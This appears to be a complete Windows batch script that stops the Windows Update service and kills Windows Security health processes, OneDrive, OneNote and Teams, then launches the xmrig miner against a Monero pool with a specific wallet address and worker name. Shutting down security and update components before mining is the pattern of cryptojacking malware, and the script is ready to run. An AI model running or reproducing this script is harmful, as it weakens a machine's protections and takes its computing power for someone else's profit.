@echo off
net stop WUAUSERV
taskkill /IM OneDrive.exe
taskkill /IM SecurityHealthSystray.exe
taskkill /IM SecurityHealthService.exe
taskkill /IM ONENOTEM.exe
taskkill /IM Teams.exe
cd /d "%~dp0"
xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Marcos-11-01 -p x -t 2
pause 
